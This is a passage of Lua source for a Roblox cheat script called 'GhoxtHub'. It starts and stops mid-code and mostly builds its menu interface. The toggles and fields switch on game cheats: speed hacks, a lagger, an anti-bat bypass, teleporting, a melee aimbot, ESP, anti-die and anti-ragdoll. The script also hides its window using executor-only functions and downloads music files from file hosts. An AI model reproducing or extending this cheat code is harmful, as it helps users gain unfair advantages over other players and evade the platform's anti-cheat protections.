                btn.TextColor3 = Color3.fromRGB(0,0,0)
            else
                btn.BackgroundColor3 = Color3.fromRGB(12,12,12)
                btn.TextColor3 = Color3.fromRGB(255,255,255)
            end
        end
    end

    if _G.keyButtonRefs then
        for _, ref in ipairs(_G.keyButtonRefs) do
            local entry = ref.entry
            local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
            ref.btn.Text = label
        end
    end

    if modeSelectBtn then
        modeSelectBtn.Text = jumpMode == 1 and "Tap Tap" or "Hold"
    end

    if setAutoStealVisual then
        setAutoStealVisual(Steal.AutoStealEnabled)
    end

    if galaxySkyEnabled then
        enableGalaxySky()
        if setGalaxySkyVisual then setGalaxySkyVisual(true) end
    else
        disableGalaxySky()
        if setGalaxySkyVisual then setGalaxySkyVisual(false) end
    end

    if antiBatSpinEnabled then
        if antiBatSpinVisual then antiBatSpinVisual(true) end
        startAntiBatSpin()
    else
        if antiBatSpinVisual then antiBatSpinVisual(false) end
        stopAntiBatSpin()
    end

    if ragdollTimerEnabled then
        if setRagdollTimerVisual then setRagdollTimerVisual(true) end
        startRagdollTimer()
    else
        if setRagdollTimerVisual then setRagdollTimerVisual(false) end
        stopRagdollTimer()
    end

    if espEnabled then
        enableESP()
    else
        disableESP()
    end

    if antiDieEnabled then
        if antiDieToggleVisual then antiDieToggleVisual(true) end
        startAntiDie()
    else
        if antiDieToggleVisual then antiDieToggleVisual(false) end
        stopAntiDie()
    end

    if meleeToggleVisual then
        meleeToggleVisual(meleeAimbotEnabled)
    end
    if meleeAimbotEnabled then
        startMeleeAimbot()
    else
        stopMeleeAimbot()
    end

    if mobSetAutoBat then mobSetAutoBat(autoBatEnabled) end
    if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
    if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
    if mobSetCarry then mobSetCarry(speedMode) end
    if mobSetLagger then mobSetLagger(laggerToggled) end
    if mobSetBatTP then mobSetBatTP(bypassToggled and bypassMode == 2) end
    if bypassSetVisual then bypassSetVisual(bypassToggled and bypassMode == 1) end
    if tpBatSetVisual then tpBatSetVisual(bypassToggled and bypassMode == 2) end

    for name, pos in pairs(mobileButtonPositions) do
        local frame = mobileButtonFrames[name]
        if frame then
            frame.Position = UDim2.new(pos.XScale or 1, pos.XOffset or 0, pos.YScale or 0, pos.YOffset or 0)
        end
    end
    if instaResetFloatingPos and instaResetFloatingButton then
        local f = instaResetFloatingButton:FindFirstChild("Frame")
        if f then
            f.Position = UDim2.new(instaResetFloatingPos.XScale or 1,
                                   instaResetFloatingPos.XOffset or getLeftOfDropBR(),
                                   instaResetFloatingPos.YScale or 0,
                                   instaResetFloatingPos.YOffset or 0)
        end
    end
    if bypassFloatingPos and bypassFloatingButton then
        local f = bypassFloatingButton:FindFirstChild("Frame")
        if f then
            f.Position = UDim2.new(bypassFloatingPos.XScale or 1,
                                   bypassFloatingPos.XOffset or getLeftOfDropBR(),
                                   bypassFloatingPos.YScale or 0,
                                   bypassFloatingPos.YOffset or (MOBILE_BTN_H + MOBILE_GAP) * 2)
        end
    end

    -- Restaurar estados de música
    for title, state in pairs(musicStates) do
        local setter = musicToggleSetters[title]
        if setter then
            setter(state)
        end
    end

    startEnemySpeed()
end

-- ========== FIN CONFIGURACIÓN ==========

-- ====== GUI ======
local gui = nil
local main = nil
local miniBtn = nil
local autoLaggerBox   -- Solo un textbox para Lagger

local function applyShimmerToText(obj, speed)
    speed = speed or 0.8
    local grad = Instance.new("UIGradient", obj)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80,80,80)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(200,200,200)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200,200,200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(80,80,80))
    })
    grad.Rotation = 45
    grad.Offset = Vector2.new(0,0)
    task.spawn(function()
        local t = 0
        while grad and grad.Parent do
            t = t + 0.02
            grad.Offset = Vector2.new(math.sin(t * speed) * 0.4, 0)
            task.wait(0.04)
        end
    end)
    return grad
end

-- ====== CONSTRUCCIÓN DE GUI ======
local function buildGui()
    local BLACK   = Color3.fromRGB(0,0,0)
    local ACCENT  = Color3.fromRGB(192,192,192)
    local INP     = Color3.fromRGB(12,12,12)
    local CORNER_RADIUS = 40
    local GUI_W, GUI_H = 450, 480   -- Reducido el ancho para dar más protagonismo a los botones
    local SIDEBAR_W = 130           -- Más estrecho para botones más pequeños
    local CONTENT_OVERLAP = 8

    local old=game:GetService("CoreGui"):FindFirstChild("GhoxtHub");if old then old:Destroy() end
    local pg=LP:FindFirstChild("PlayerGui");if pg then local o=pg:FindFirstChild("GhoxtHub");if o then o:Destroy() end end
    gui=Instance.new("ScreenGui")
    gui.Name="GhoxtHub";gui.ResetOnSpawn=false;gui.DisplayOrder=10;gui.IgnoreGuiInset=true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    if not pcall(function() gui.Parent=game:GetService("CoreGui") end) then gui.Parent=LP:WaitForChild("PlayerGui") end

    main=Instance.new("Frame",gui)
    main.Size=UDim2.new(0,GUI_W,0,GUI_H)
    main.Position=UDim2.new(0,40,0,0)
    main.BackgroundTransparency = 1
    main.BorderSizePixel = 0
    main.ClipsDescendants = true

    local mainCorner = Instance.new("UICorner", main)
    mainCorner.CornerRadius = UDim.new(0, CORNER_RADIUS)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = Color3.fromRGB(255,255,255)
    mainStroke.Thickness = 1.5
    mainStroke.Transparency = 0.6

    -- ========== FONDO CON NUEVA IMAGEN (CUBRE TODO EL MENÚ) ==========
    local fondoImagen = Instance.new("ImageLabel", main)
    fondoImagen.Name = "FondoImagen"
    fondoImagen.Size = UDim2.new(1, 0, 1, 0)   -- Ocupa todo el main
    fondoImagen.Position = UDim2.new(0, 0, 0, 0)
    fondoImagen.BackgroundTransparency = 1
    fondoImagen.Image = "rbxassetid://92033898670280"  -- NUEVA IMAGEN DE FONDO
    fondoImagen.ImageTransparency = 0
    fondoImagen.ScaleType = Enum.ScaleType.Crop
    fondoImagen.ZIndex = 0
    local imgCorner = Instance.new("UICorner", fondoImagen)
    imgCorner.CornerRadius = UDim.new(0, CORNER_RADIUS)

    -- ====== OVERLAY PARA FADE (ANIMACIÓN DE CIERRE) ======
    local fadeOverlay = Instance.new("Frame", main)
    fadeOverlay.Name = "FadeOverlay"
    fadeOverlay.Size = UDim2.new(1, 0, 1, 0)
    fadeOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    fadeOverlay.BackgroundTransparency = 1
    fadeOverlay.BorderSizePixel = 0
    fadeOverlay.ZIndex = 100
    fadeOverlay.Visible = true

    local sidebar = Instance.new("Frame", main)
    sidebar.Size = UDim2.new(0, SIDEBAR_W, 1, 0)
    sidebar.Position = UDim2.new(0,0,0,0)
    sidebar.BackgroundColor3 = Color3.fromRGB(255,255,255)
    sidebar.BackgroundTransparency = 0.95
    sidebar.BorderSizePixel = 0
    sidebar.ClipsDescendants = true
    local sidebarCorner = Instance.new("UICorner", sidebar)
    sidebarCorner.CornerRadius = UDim.new(0, CORNER_RADIUS)
    local sideStroke = Instance.new("UIStroke", sidebar)
    sideStroke.Color = Color3.fromRGB(200,200,200)
    sideStroke.Thickness = 1
    sideStroke.Transparency = 0.5

    local divider = Instance.new("Frame", main)
    divider.Size = UDim2.new(0,1,1,-24)
    divider.Position = UDim2.new(0,SIDEBAR_W,0,12)
    divider.BackgroundColor3 = Color3.fromRGB(200,200,200)
    divider.BorderSizePixel = 0

    local TAB_NAMES = {"Speed", "Duel", "Other", "Keybinds", "Config"}
    local tabBtns = {}

    local tabListFrame = Instance.new("Frame", sidebar)
    tabListFrame.Size = UDim2.new(1,0,1,0)
    tabListFrame.Position = UDim2.new(0,0,0,0)
    tabListFrame.BackgroundTransparency = 1

    local tabLL = Instance.new("UIListLayout", tabListFrame)
    tabLL.SortOrder = Enum.SortOrder.LayoutOrder
    tabLL.Padding = UDim.new(0, 10)         -- Reducido el espacio entre botones
    local tabPad = Instance.new("UIPadding", tabListFrame)
    tabPad.PaddingLeft = UDim.new(0, 8)
    tabPad.PaddingRight = UDim.new(0, 8)
    tabPad.PaddingTop = UDim.new(0, 8)      -- Menos padding superior
    tabPad.PaddingBottom = UDim.new(0, 8)   -- Menos padding inferior

    local function switchTab(name) end

    for i, name in ipairs(TAB_NAMES) do
        local btn = Instance.new("TextButton", tabListFrame)
        btn.Size = UDim2.new(1,0,0,28)      -- Altura reducida de 36 a 28
        btn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
        btn.BackgroundTransparency = 0
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.LayoutOrder = i
        btn.AutoButtonColor = false

        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 16)  -- Más redondeado (antes 12)
        local stroke = Instance.new("UIStroke", btn)
        stroke.Color = Color3.fromRGB(255,255,255)
        stroke.Thickness = 1
        stroke.Transparency = 0.6

        local lbl = Instance.new("TextLabel", btn)
        lbl.Size = UDim2.new(1,0,1,0)
        lbl.BackgroundTransparency = 1
        lbl.Text = name
        lbl.TextColor3 = Color3.fromRGB(0,0,0)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11                     -- Fuente más pequeña (antes 13)
        lbl.TextXAlignment = Enum.TextXAlignment.Center

        local activeIndicator = Instance.new("Frame", btn)
        activeIndicator.Size = UDim2.new(0.8,0,0,2)
        activeIndicator.Position = UDim2.new(0.1,0,1,-2)
        activeIndicator.BackgroundColor3 = Color3.fromRGB(255,255,255)
        activeIndicator.BorderSizePixel = 0
        activeIndicator.Visible = (name == "Speed")
        Instance.new("UICorner", activeIndicator).CornerRadius = UDim.new(1,0)

        tabBtns[name] = {bg = btn, lbl = lbl, ind = activeIndicator, stroke = stroke}
        btn.MouseButton1Click:Connect(function()
            switchTab(name)
        end)
    end

    local rightPanel = Instance.new("Frame", main)
    rightPanel.Size = UDim2.new(0, GUI_W - SIDEBAR_W - 1, 1, 0)
    rightPanel.Position = UDim2.new(0, SIDEBAR_W+1, 0, 0)
    rightPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
    rightPanel.BackgroundTransparency = 0.95
    rightPanel.BorderSizePixel = 0
    rightPanel.ClipsDescendants = true
    local rightCorner = Instance.new("UICorner", rightPanel)
    rightCorner.CornerRadius = UDim.new(0, CORNER_RADIUS)
    local rightStroke = Instance.new("UIStroke", rightPanel)
    rightStroke.Color = Color3.fromRGB(200,200,200)
    rightStroke.Thickness = 1
    rightStroke.Transparency = 0.5

    local topBar = Instance.new("Frame", rightPanel)
    topBar.Size = UDim2.new(1,0,0,44)
    topBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
    topBar.BackgroundTransparency = 0.95
    topBar.BorderSizePixel = 0
    local topBarDiv = Instance.new("Frame", rightPanel)
    topBarDiv.Size = UDim2.new(1,-20,0,1)
    topBarDiv.Position = UDim2.new(10,0,0,44)
    topBarDiv.BackgroundColor3 = Color3.fromRGB(200,200,200)
    topBarDiv.BorderSizePixel = 0

    local panelTitle = Instance.new("TextLabel", topBar)
    panelTitle.Size = UDim2.new(1,-50,1,0)
    panelTitle.Position = UDim2.new(0,16,0,0)
    panelTitle.BackgroundTransparency = 1
    panelTitle.Text = "Speed"
    panelTitle.TextColor3 = Color3.fromRGB(0,0,0)
    panelTitle.Font = Enum.Font.GothamBlack
    panelTitle.TextSize = 16
    panelTitle.TextXAlignment = Enum.TextXAlignment.Left

    local closeBtn = Instance.new("TextButton", topBar)
    closeBtn.Size = UDim2.new(0,28,0,28)
    closeBtn.Position = UDim2.new(1,-34,0.5,-14)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220,220,220)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "–"
    closeBtn.TextColor3 = Color3.fromRGB(0,0,0)
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 20
    closeBtn.AutoButtonColor = false
    closeBtn.ZIndex = 50
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1,0)

    -- Evento de cierre con animación fade-out
    closeBtn.MouseButton1Click:Connect(function()
        TS:Create(fadeOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
        task.wait(0.4)
        main.Visible = false
        miniBtn.Visible = true
        fadeOverlay.BackgroundTransparency = 1  -- reset para próxima vez
    end)

    local contentArea = Instance.new("Frame", rightPanel)
    contentArea.Size = UDim2.new(1,0,1,-45)
    contentArea.Position = UDim2.new(0,0,0,45)
    contentArea.BackgroundTransparency = 1
    contentArea.ClipsDescendants = true

    local pages = {}
    for _, name in ipairs(TAB_NAMES) do
        local sf = Instance.new("ScrollingFrame", contentArea)
        sf.Size = UDim2.new(1,0,1,0)
        sf.BackgroundTransparency = 1
        sf.BorderSizePixel = 0
        sf.ScrollBarThickness = 6
        sf.ScrollBarImageColor3 = Color3.fromRGB(120,120,120)
        sf.ScrollingEnabled = true
        sf.Visible = false
        sf.AutomaticCanvasSize = Enum.AutomaticSize.Y
        sf.CanvasSize = UDim2.new(0,0,0,0)

        local ll = Instance.new("UIListLayout", sf)
        ll.SortOrder = Enum.SortOrder.LayoutOrder
        ll.Padding = UDim.new(0, 4)
        ll.FillDirection = Enum.FillDirection.Vertical

        local pp = Instance.new("UIPadding", sf)
        pp.PaddingLeft = UDim.new(0, 12)
        pp.PaddingRight = UDim.new(0, 12)
        pp.PaddingTop = UDim.new(0, 0)
        pp.PaddingBottom = UDim.new(0, 40)

        pages[name] = sf
    end
    local activePage = pages["Speed"]
    activePage.Visible = true

    switchTab = function(name)
        if activePage then activePage.Visible = false end
        activePage = pages[name]
        activePage.Visible = true
        panelTitle.Text = name
        for tName, tData in pairs(tabBtns) do
            local isActive = (tName == name)
            tData.lbl.TextColor3 = Color3.fromRGB(0,0,0)
            tData.bg.BackgroundColor3 = isActive and Color3.fromRGB(255,255,255) or Color3.fromRGB(80,0,0)
            tData.ind.Visible = isActive
            tData.stroke.Transparency = isActive and 0 or 0.6
            tData.stroke.Color = isActive and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
        end
    end

    -- ========================================================================
    -- 🔥 FUNCIONES DE UI (MODIFICADAS A ROJO TRANSPARENTE)
    -- ========================================================================

    local function mkSect(txt, color)
        local f = Instance.new("Frame", activePage)
        f.Size = UDim2.new(1, 0, 0, 22)
        f.BackgroundTransparency = 1
        f.BorderSizePixel = 0
        local l = Instance.new("TextLabel", f)
        l.Size = UDim2.new(1, -10, 1, 0)
        l.Position = UDim2.new(0, 10, 0, 0)
        l.BackgroundTransparency = 1
        l.Text = txt:upper()
        l.TextColor3 = color or Color3.fromRGB(0,0,0)
        l.Font = Enum.Font.GothamBold
        l.TextSize = 11
        l.TextXAlignment = Enum.TextXAlignment.Left
        f.LayoutOrder = #activePage:GetChildren() + 1
        applyShimmerToText(l, 0.5)
        return f
    end

    local function mkToggle(txt, cb)
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.BorderSizePixel = 0
        row.LayoutOrder = #activePage:GetChildren() + 1

        local label = Instance.new("TextLabel", row)
        label.Size = UDim2.new(0.7, 0, 1, 0)
        label.Position = UDim2.new(0, 11, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = txt
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left

        local pill = Instance.new("Frame", row)
        pill.Size = UDim2.new(0, 46, 0, 24)
        pill.Position = UDim2.new(1, -56, 0.5, -12)
        pill.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        pill.BackgroundTransparency = 0
        pill.BorderSizePixel = 0
        Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
        local stroke = Instance.new("UIStroke", pill)
        stroke.Color = Color3.fromRGB(255, 255, 255)
        stroke.Thickness = 1
        stroke.Transparency = 0

        local dot = Instance.new("Frame", pill)
        dot.Size = UDim2.new(0, 18, 0, 18)
        dot.Position = UDim2.new(0, 3, 0.5, -9)
        dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        dot.BorderSizePixel = 0
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        local on = false
        local function sv(s)
            on = s
            local dotTargetPos = on and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
            TS:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), {Position = dotTargetPos}):Play()
            local bgColor = on and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(0, 0, 0)
            TS:Create(pill, TweenInfo.new(0.18), {BackgroundColor3 = bgColor}):Play()
            local strokeColor = on and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(255, 255, 255)
            TS:Create(stroke, TweenInfo.new(0.18), {Color = strokeColor}):Play()
        end

        local clk = Instance.new("TextButton", pill)
        clk.Size = UDim2.new(1,0,1,0)
        clk.BackgroundTransparency = 1
        clk.Text = ""
        clk.Activated:Connect(function()
            on = not on
            sv(on)
            pcall(cb, on)
            saveNow()
        end)
        return sv
    end

    local function mkBox(parent, default, w, xOff, cb)
        local tb = Instance.new("TextBox", parent)
        local bw = w or 50
        local xo = math.max(xOff or 56, bw + 8)
        tb.Size = UDim2.new(0, bw, 0, 26)
        tb.Position = UDim2.new(1, -xo, 0.5, -13)
        tb.BackgroundColor3 = Color3.fromRGB(12,12,12)
        tb.BorderSizePixel = 0
        tb.Text = tostring(default)
        tb.TextColor3 = Color3.fromRGB(255, 255, 255)
        tb.Font = Enum.Font.GothamBold
        tb.TextSize = 11
        tb.ClearTextOnFocus = false
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 7)
        local bs = Instance.new("UIStroke", tb)
        bs.Color = Color3.fromRGB(80,80,80)
        bs.Thickness = 1
        bs.Transparency = 0.28
        tb.Focused:Connect(function() TS:Create(bs,TweenInfo.new(0.12),{Color=Color3.fromRGB(192,192,192),Transparency=0}):Play() end)
        tb.FocusLost:Connect(function()
            TS:Create(bs,TweenInfo.new(0.12),{Color=Color3.fromRGB(80,80,80),Transparency=0.28}):Play()
            if cb then local n = tonumber(tb.Text); if n then cb(n) end; saveNow() end
        end)
        return tb
    end

    local function mkSelector(parent, default, cb)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(0, 50, 0, 26)
        btn.Position = UDim2.new(1, -56, 0.5, -13)
        btn.BackgroundColor3 = Color3.fromRGB(12,12,12)
        btn.BorderSizePixel = 0
        btn.Text = default
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 12
        btn.TextXAlignment = Enum.TextXAlignment.Center
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
        local stroke = Instance.new("UIStroke", btn)
        stroke.Color = Color3.fromRGB(80,80,80)
        stroke.Thickness = 1
        btn.MouseButton1Click:Connect(function()
            if _anyKeyListening then return end
            if cb then cb(btn) end
            saveNow()
        end)
        return btn
    end

    -- ========== Construcción de páginas ==========

    mkSect("Speed")
    do 
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Normal Speed"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        normalBox = mkBox(row, NS, 50, 56, function(v) if v>0 and v<=500 then NS=v end end)
    end
    do 
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Carry Speed"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        carryBox = mkBox(row, CS, 50, 56, function(v) if v>0 and v<=500 then CS=v end end)
    end

    mkSect("| Speed Lagger", Color3.fromRGB(255, 255, 255))
    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Lagger Speed"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        autoLaggerBox = mkBox(row, LAGGER_SPEED_1, 50, 56, function(v)
            if v>0 and v<=500 then
                LAGGER_SPEED_1 = v
                -- También actualizamos LAGGER_SPEED_2 si se desea, pero lo dejamos igual
            end
        end)
    end

    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Height Y (Auto TP)"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        autoTPHeightBox = mkBox(row, autoTPHeight, 50, 56, function(v) if v>=1 and v<=500 then autoTPHeight=v; autoTPDownThreshold=v end end)
    end

    mkSect("")
    bypassSetVisual = mkToggle("Bypass-Anti Bat", function(on)
        if on then
            if bypassToggled and bypassMode == 2 then
                toggleTPBat(false)
            end
            bypassMode = 1
            toggleBypass(true)
            if bypassFloatingButton then
                local btnFrame = bypassFloatingButton:FindFirstChild("Frame")
                if btnFrame then
                    local label = btnFrame:FindFirstChild("TextLabel")
                    btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    if label then label.TextColor3 = Color3.fromRGB(100, 180, 255) end
                end
            end
            if mobSetBatTP then mobSetBatTP(false) end
        else
            toggleBypass(false)
        end
        if bypassSetVisual then bypassSetVisual(on) end
        if tpBatSetVisual then tpBatSetVisual(false) end
    end)
    if bypassSetVisual then bypassSetVisual(bypassToggled and bypassMode == 1) end

    tpBatSetVisual = mkToggle("TP Bat", function(on)
        toggleTPBat(on)
    end)
    if tpBatSetVisual then tpBatSetVisual(bypassToggled and bypassMode == 2) end

    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Bypass Speed"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        bypassSpeedBox = mkBox(row, BYPASS_AIMBOT_SPEED, 50, 56, function(v) if v>0 and v<=200 then BYPASS_AIMBOT_SPEED=v end end)
    end

    -- ====== SECCIÓN DE MÚSICA (AGREGADA) ======
    mkSect("| Music", Color3.fromRGB(255, 255, 255))

    -- Funciones auxiliares para música (dentro de buildGui para tener acceso a mkToggle)
    local function fileExists(path)
        if type(isfile) ~= "function" then return false end
        local ok, exists = pcall(isfile, path)
        return ok and exists == true
    end

    local function validAudio(data)
        if type(data) ~= "string" or #data < 2048 then return false end
        local header = data:sub(1, 256):lower()
        return not (
            header:find("<html", 1, true) or
            header:find("<!doctype", 1, true) or
            header:find("access denied", 1, true) or
            header:find("not found", 1, true) or
            header:find("error", 1, true)
        )
    end

    local function downloadAudio(url, path)
        if type(writefile) ~= "function" then
            return false, "writefile no está disponible"
        end
        local data, lastError
        local requestFunction = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
        if type(requestFunction) == "function" then
            local ok, response = pcall(requestFunction, {
                Url = url,
                Method = "GET",
                Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "audio/mpeg,audio/*;q=0.9,*/*;q=0.8" }
            })
            if ok and type(response) == "table" then
                local code = tonumber(response.StatusCode or response.Status or response.status_code) or 0
                local body = response.Body or response.body
                if (code == 0 or (code >= 200 and code < 300)) and validAudio(body) then
                    data = body
                else
                    lastError = "respuesta HTTP inválida (" .. tostring(code) .. ")"
                end
            elseif not ok then
                lastError = tostring(response)
            end
        end
        if not data then
            local ok, result = pcall(function() return game:HttpGet(url, true) end)
            if ok and validAudio(result) then
                data = result
            elseif not ok then
                lastError = tostring(result)
            elseif not lastError then
                lastError = "el enlace no devolvió un MP3 válido"
            end
        end
        if not data then return false, lastError or "no se pudo descargar el audio" end
        local ok, err = pcall(writefile, path, data)
        if not ok then return false, tostring(err) end
        return true
    end

    local function addSong(config)
        local sound
        local wantedOn = false
        local preparing = false
        local started = false
        local loadedConnection

        local function destroySound()
            if loadedConnection then loadedConnection:Disconnect(); loadedConnection = nil end
            if sound then pcall(function() sound:Destroy() end); sound = nil end
            started = false
        end

        local function createSound()
            if type(getcustomasset) ~= "function" then return false, "getcustomasset no está disponible" end
            local ok, assetId = pcall(getcustomasset, config.file)
            if not ok or type(assetId) ~= "string" or assetId == "" then return false, "el archivo local todavía no está disponible" end
            destroySound()
            sound = Instance.new("Sound")
            sound.Name = config.soundName
            sound.SoundId = assetId
            sound.Volume = config.volume
            sound.Looped = true
            sound.Parent = SoundService
            if config.startAt and config.startAt > 0 then
                pcall(function() sound.TimePosition = config.startAt end)
                loadedConnection = sound.Loaded:Connect(function()
                    if loadedConnection then loadedConnection:Disconnect(); loadedConnection = nil end
                    if sound and sound.Parent then pcall(function() sound.TimePosition = config.startAt end) end
                end)
            end
            table.insert(musicSounds, sound)
            return true
        end

        local function playNow()
            if not sound or not sound.Parent then return end
            if started then
                local ok = pcall(function() sound:Resume() end)
                if not ok then pcall(function() sound:Play() end) end
            else
                if config.startAt and config.startAt > 0 then pcall(function() sound.TimePosition = config.startAt end) end
                pcall(function() sound:Play() end)
                started = true
            end
        end

        local function prepare()
            if sound and sound.Parent then
                if wantedOn then playNow() end
                return
            end
            if preparing then return end
            preparing = true
            local alreadyDownloaded = fileExists(config.file)
            local created = select(1, createSound())
            if not created then
                if not alreadyDownloaded then
                    -- notificar silenciosamente
                end
                local downloaded, downloadError = downloadAudio(config.url, config.file)
                if not downloaded then
                    preparing = false
                    return
                end
                local okCreate, createError = createSound()
                if not okCreate then
                    preparing = false
                    return
                end
            end
            preparing = false
            if wantedOn then playNow() end
        end

        if fileExists(config.file) then task.defer(function() if not sound then createSound() end end) end

        local setter = mkToggle(config.title, function(on)
            wantedOn = on
            musicStates[config.title] = on
            if on then
                if sound and sound.Parent then playNow()
                else task.spawn(prepare) end
            elseif sound then pcall(function() sound:Pause() end) end
            pcall(saveAllSettings)
        end)
        musicToggleSetters[config.title] = setter
        if musicStates[config.title] == nil then musicStates[config.title] = false end
        task.defer(function()
            if musicStates[config.title] then setter(true) else setter(false) end
        end)
    end

    -- Canciones solicitadas (sin texto extra)
    local songs = {
        { title = "Cuando no era cantante", url = "https://files.catbox.moe/mcy3cd.mp3", file = "ghost_cuando_no_era_cantante.mp3", soundName = "Ghost_CuandoNoEra", volume = 0.75 },
        { title = "King nassir Music", url = "https://file.garden/anQAxCXXiQfEPX90/king%20nasir%20full%20song.mp3", file = "ghost_king_nassir.mp3", soundName = "Ghost_KingNassir", volume = 0.75 },
        { title = "Amanece Anuel AA", url = "https://files.catbox.moe/8pi32q.mp3", file = "ghost_amanece_anuel.mp3", soundName = "Ghost_AmaneceAnuel", volume = 0.75 },
        { title = "Cuando Sera Mora x Lunay", url = "https://files.catbox.moe/lsbw2b.mp3", file = "ghost_cuando_sera_mora.mp3", soundName = "Ghost_CuandoSera", volume = 0.75 },
        { title = "Trap Capos Noriel De las 2", url = "https://files.catbox.moe/fab23k.mp3", file = "ghost_trap_capos_noriel.mp3", soundName = "Ghost_TrapCapos", volume = 0.75 },
    }
    for _, config in ipairs(songs) do addSong(config) end

    setActivePage = switchTab
    switchTab("Duel")
    mkSect("Duel Combat")

    do
        local on = antiRagdollEnabled
        local setter = mkToggle("Anti Ragdoll", function(s) 
            antiRagdollEnabled = s
            if s then startAntiRagdoll() else stopAntiRagdoll() end
            if setAntiRagVisual then setAntiRagVisual(s) end
            saveNow()
        end)
        setAntiRagVisual = setter
        setter(on)
    end

    do
        local on = medusaCounterEnabled
        local setter = mkToggle("Medusa Counter", function(s) setMedusaCounterState(s) end)
        setMedusaVisual = setter
        setter(on)
    end

    do
        local on = medusaAutoResetEnabled
        local setter = mkToggle("Medusa Auto Reset", function(s) setMedusaAutoResetState(s) end)
        setMedusaAutoResetVisual = setter
        setter(on)
    end

    do
        local on = batCounterEnabled
